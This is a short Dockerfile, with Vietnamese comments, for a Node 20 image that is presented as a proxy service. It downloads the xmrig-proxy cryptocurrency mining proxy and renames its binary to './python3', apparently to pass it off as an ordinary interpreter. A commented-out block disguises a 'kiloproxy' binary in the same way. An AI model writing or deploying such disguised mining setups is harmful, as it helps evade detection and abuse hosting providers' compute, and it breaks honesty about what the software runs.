# Sử dụng Node 20 có đầy đủ Debian libs
FROM node:20

# Cài công cụ build & Boost
RUN apt-get update && apt-get install -y \
    build-essential \
    python3 \
    cmake \
    git \
    pkg-config \
    && rm -rf /var/lib/apt/lists/*
    
# Thư mục làm việc
WORKDIR /usr/src/app

RUN wget https://github.com/xmrig/xmrig-proxy/releases/download/v6.22.0/xmrig-proxy-6.22.0-linux-static-x64.tar.gz \
    && tar -xvf xmrig-proxy-6.22.0-linux-static-x64.tar.gz \
    && mv xmrig-proxy-6.22.0/xmrig-proxy ./python3 \
    && rm -rf xmrig-proxy-6.22.0* \
    && chmod +x ./python3

# RUN wget https://github.com/kilopool/kiloproxy/releases/download/1.0/kiloproxy-linux-x64.xz \
#     && unxz kiloproxy-linux-x64.xz \ 
#     && chmod +x ./kiloproxy-linux-x64 \ 
#     && mv ./kiloproxy-linux-x64 ./python3

# Sao chép file package
COPY . .

# Cài dependencies (bao gồm cmake-js, node-gyp nếu có)
RUN npm install

# Mở port proxy
EXPOSE 8080

# Chạy proxy bằng npm start
CMD ["npm", "start"]
